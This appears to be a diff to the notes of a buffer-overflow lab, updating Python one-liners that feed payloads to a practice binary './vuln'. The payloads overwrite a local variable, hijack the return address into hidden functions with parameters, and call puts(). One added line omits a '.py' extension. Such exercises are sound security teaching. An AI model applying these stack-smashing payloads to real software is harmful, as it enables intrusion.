@@ -101,18 +101,19 @@ Disassembly of section .text:
 # We use the Python exploit scripts to determine each exploit.
 
 # Overwrite the local variable. Print message "Comm-link online."
-python payload_local_var.py | ./vuln 
-python -c 'print 0x40*"A" + "\x5a\x5a\x5a\x5a"' | ./vuln
+python3 payload_local_var.py | ./vuln
+python3 -c 'import os; os.write(1, 0x40*b"A" + b"\x5a\x5a\x5a\x5a")' | ./vuln
 
 # Overwrite return address. Print message "Channel open."
 # nm vuln +> & of secret func is 0x080491a7
-python -c 'print 0x48*"A" + "\xa7\x91\x04\x08"' | ./vuln
+python3 payload_secret_func | ./vuln
+python3 -c 'import os; os.write(1, 0x48*b"A" + b"\xa7\x91\x04\x08")' | ./vuln
 
 # Overwrite return address with function parameters. Print message "Systems functional."
 # get &secret_param_func from nm vuln| grep func 
-python payload_secret_param_func.py | ./vuln 
+python3 payload_secret_param_func.py | ./vuln
+python3 -c 'import os; os.write(1, 0x48*b"A" + b"\x82\x91\x04\x08" + 0x04*b"B" + b"\x78\x56\x34\x12" + b"\x01\xef\xcd\xab")'| ./vuln
 
 # Print secret_message by overwriting with address of puts() function. Print message "Acknowledged H.Q."
-python payload_secret_message.py | ./vuln
-
-
+python3 payload_secret_message.py | ./vuln
+python3 -c 'import os; os.write(1, 0x48*b"A" + b"\x50\x90\x04\x08" + 0x04*b"B" + b"\x08\xa0\x04\x08")' | ./vuln
